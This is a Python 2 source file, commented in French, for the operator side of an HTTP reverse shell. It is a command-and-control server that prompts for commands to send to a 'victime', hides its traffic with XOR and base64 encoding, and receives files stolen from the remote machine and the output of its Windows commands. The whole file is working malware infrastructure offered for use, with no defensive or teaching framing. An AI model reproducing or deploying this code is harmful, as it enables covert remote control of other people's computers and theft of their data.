import BaseHTTPServer
import os
import cgi
import HTTP_reverse_shell_server
import base64
from operator import xor

# -*- coding: utf-8 -*-

HOST_NAME = '10.142.10.22'
PORT_NUMBER = 80
HTTP_reverse_shell_server.FILE_NAME = 'sans-nom'
WHATISTHIS = 'bv0JGFncE655pm6h09k4b1AxEvSygMD5ZwUXQEekiWdSeOiE1CyGqnPaWwDNnBQUcJAWOGFRwU2KfjOerxsJNcUmxMuuUtOXupTtAUi9rNIm2sVa9HMue6vznNyyrAWX1h5acF4iBc9MrYSMult1DQjzmLGD4d5BIRxuxwfmzYjvA0wHHAcp1lk3hfQC6dWeLAJbq89E1O3AmNhOM49QsYwx2fy6YLZEzn0udCPUzrzUq5rqx0RifKpgoEWPK0C1mjfvSnH51mwti23d0irclpEBcs6n2b525VrM4gsY6R2DSMbUnasCsi4H6bJb6YgnrZBmg1z1xmRwQJ3AmVjALuNp9q0uOfYvgZFpMkQXN6KVA2Jn9yqhhZOXMgMi58tpAAHgG8qQ0Co6bC6fs31p6rf6a8xdmSg0n1KLQ2QZhfTDp64lB4MDpKDrT1RLHIt6wfBQBjwB9Atg5lyV8bhUNlaI8B8t0lXVc6M2CMGyCr0Ndhr4w4NHuWppgXvxi4CTElVL1dG131Fa5zzmVVaRzIB8vCm66HuiQAR1SgjDmR05cP9XRA6MWbl9KRoLgKAsqGyE4tjhUWF2dVSDD1jmTpIpCCfMEg63zNNNTgHhlkxg6sA6KTLk8DlV1MoENl5PzpUVfxXJ1CA4UvmmVP1zHmHnth1ORdckh2GQPIVguGMWBN4S6y1QCtn6SVTZNgKnMNHfkZJg5Pdo6kN4Tpo0Anj3afymLqaEBZHaNwThW0OWHtEtHacG2k5prCXz63LKLO1w01bFxH26UzqP1vveMvvOI0ImX0GidCBeFfPUJE86y5zi1vyY5l9GxGcP13uWmbONQawWG4S6iGjEGVoTaQSBZoyT3pDF3l3MRnRMgOQlymsF1oA46eHYuNKfBa2slXx8gE8VW9zrariVzppKszhWJSxqwehcbqYBAmklv4twwvFt0WX4TUWrAQukCXjoSzIgJc20WMAgNtBn6U5SNPYZgn51HcimSrC4KWQ4zPtCLNg68KrUgMPwqHGgBhat'


def chiffre(s1):
        s2 = WHATISTHIS
        while len(s1) > len(s2):
                s2 += WHATISTHIS
        return base64.b64encode("".join([chr(ord(c1) ^ ord(c2)) for (c1, c2) in zip(s1, s2)]))
              

def dechiffre(s1):
        s1 = base64.b64decode(s1)
        s2 = WHATISTHIS
        while len(s1) > len(s2):
                s2 += WHATISTHIS
        return "".join([chr(ord(c1) ^ ord(c2)) for (c1, c2) in zip(s2, s1)])

class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    def do_GET(s):
    
        command = raw_input("Victime de propA> ")
        if command == "":
                command = " "
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()
        envoie = chiffre(command)
        s.wfile.write(envoie)


    def do_POST(s):

        #Nom de fichier et fichier inconnu
        FILE_NAME = 'sans-nom'
        if s.path == '/nomDeFichier':

            s.send_response(200)
            s.send_header("Content-type", "text/html")
            s.end_headers()
            length = 0
                    
            if s.headers.getheader('Content-Length') is not None:
                length = int(s.headers.getheader('Content-Length'))
            data = s.rfile.read(length)
            postVar = dechiffre(data)
            print postVar

            if 'Nom du fichier' in postVar:
                HTTP_reverse_shell_server.FILE_NAME = postVar.replace("Nom du fichier: ", "", 1).split("\\")[-1]
                return

            elif 'Fichier introuvable' in postVar:
                print '[-] Fichier introuvable, c\'est le bon path?'
                return


        #Commande VOL
        elif s.path == '/store':
            
            try:
                             
                fs = None
                ctype, blabla = cgi.parse_header(s.headers.getheader('content-type'))

                if ctype == 'multipart/form-data':

                    if s.headers.getheader('Content-Length') is not None:
                        length = int(s.headers.getheader('Content-Length'))
                    data= s.rfile.read(length)
                    postVar = dechiffre(data)

                    try:                    
                        with open(HTTP_reverse_shell_server.FILE_NAME, 'wb') as o:
                                o.write(postVar)
                                s.send_response(200)
                                s.end_headers()
                                print '[+] Fichier \''+str(HTTP_reverse_shell_server.FILE_NAME)+'\' recupere avec succes!'
                    except Exception as e:
                        print '[+] Le fichier \''+str(HTTP_reverse_shell_server.FILE_NAME)+'\' ra rencontre un probleme lors de son telechargement! Verifier si vous l\'avez recu.'
                else:
                    print '[-] Fichier vide, un probleme a du arriver'
                    return

            except Exception as e:
                print '[-] Error: '+str(e)
            return

                    
        #Commande Windows classique
        else:
            s.send_response(200)
            s.end_headers()
            length = 0
            if s.headers.getheader('Content-Length') is not None:
                length = int(s.headers.getheader('Content-Length'))
            postVar = s.rfile.read(length)
            postVar = dechiffre(postVar)
            print postVar





if __name__ == '__main__':
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)


    try:
        httpd.serve_forever()
        print 'Taper \'aide\' pour connaitre les commandes a taper'
    except KeyboardInterrupt:
        print '[!] serveur web deco'
        httpd.server_close()
